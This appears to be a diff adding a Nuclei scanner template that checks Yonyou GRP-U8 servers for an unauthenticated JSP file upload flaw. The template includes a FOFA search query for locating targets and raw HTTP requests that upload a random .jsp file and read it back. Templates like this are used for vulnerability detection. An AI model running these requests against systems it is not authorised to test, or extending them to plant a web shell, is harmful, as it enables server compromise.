@@ -1,0 +1,44 @@
+id: poc-local-oa-yonyou-GRP-U8-FileUpload-fileupload
+
+info:
+  name: poc-local-oa-yonyou-GRP-U8-FileUpload-fileupload
+  author: capiton
+  severity: critical
+  description: ""
+  reference:
+    - https://mp.weixin.qq.com/s/9oGP2AGC57E9ijwLuR2_Ng
+  metadata:
+    fofa-query: title="用友GRP-U8行政事业内控管理软件"
+    Vulnerability-Impact: 用友GRP
+  tags: yonyou,oa
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
+  file_content: "{{to_lower(rand_text_alpha(26))}}"
+requests:
+  - raw:
+      - |
+        POST /servlet/FileUpload?fileName={{file_name}}&actionID=update HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------32840991842344344364451981273
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+
+        {{file_content}}
+      - |
+        GET /R9iPortal/upload/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "{{file_content}}"
